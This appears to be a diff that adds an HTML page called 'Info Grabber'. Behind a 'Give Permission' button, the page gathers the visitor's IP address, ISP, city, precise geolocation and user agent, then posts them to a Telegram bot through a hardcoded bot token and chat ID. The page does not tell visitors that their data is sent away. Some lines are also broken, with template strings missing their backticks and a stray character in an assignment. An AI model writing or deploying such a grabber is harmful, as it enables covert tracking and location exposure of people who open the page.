@@ -1,0 +1,42 @@
+<!DOCTYPE html><html lang="en">
+<head>  <meta charset="UTF-8">
+  <title>Info Grabber</title>  <style>
+    body { font-family: Arial; padding: 20px; background: #f0f0f0; }    .box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+  </style></head>
+<body>  <div class="box">
+    <h2>Show Us Your Info</h2>    <button onclick="collectAndSend()">Give Permission</button>
+    <pre id="result">Waiting for permission...</pre>  </div>
+  <script>
+    const BOT_TOKEN = "8011619975:AAE_Donqy5xn8RD0lJ2LOIP326dTDrnO1Ag";    const CHAT_ID = "6065284869";
+    async function getIPInfo() {
+      const res = await fetch("https://ipapi.co/json/");      return await res.json();
+    }
+    async function sendToTelegram(message) {      const url = https://api.telegram.org/bot${BOT_TOKEN}/sendMessage;
+      await fetch(url, {        method: "POST",
+        headers: { "Content-Type": "application/json" },        body: JSON.stringify({
+          chat_id: CHAT_ID,          text: message
+        })      });
+    }
+    async function collectAndSend() {      const ipInfo = await getIPInfo();
+      let locationInfo = "";
+      if (navigator.geolocation) {        navigator.geolocation.getCurrentPosition(async (position) => {
+          locationInfo = Location:
+Lat: ${position.coords.latitude}Lon: ${position.coords.longitude}
+Accuracy: ${position.coords.accuracy}m;          const message = 
+New Visitor Info:IP: ${ipInfo.ip}
+ISP: ${ipInfo.org}City: ${ipInfo.city}
+Region: ${ipInfo.region}Country: ${ipInfo.country_name}
+User-Agent: ${navigator.userAgent}Time: ${new Date().toLocaleString()}
+${locationInfo};
+          document.getElementById("result").textContent = message;          await sendToTelegram(message);
+        }, async (error) => {          const message ʼ= 
+New Visitor Info (no location permission):IP: ${ipInfo.ip}
+ISP: ${ipInfo.org}City: ${ipInfo.city}
+Region: ${ipInfo.region}Country: ${ipInfo.country_name}
+User-Agent: ${navigator.userAgent}Time: ${new Date().toLocaleString()};`
+          document.getElementById("result").textContent = message;          await sendToTelegram(message);
+        });      } else {
+        const fallbackMessage = "Geolocation not supported.";        document.getElementById("result").textContent = fallbackMessage;
+        await sendToTelegram(fallbackMessage);      }
+    }  </script>
+</body></html>
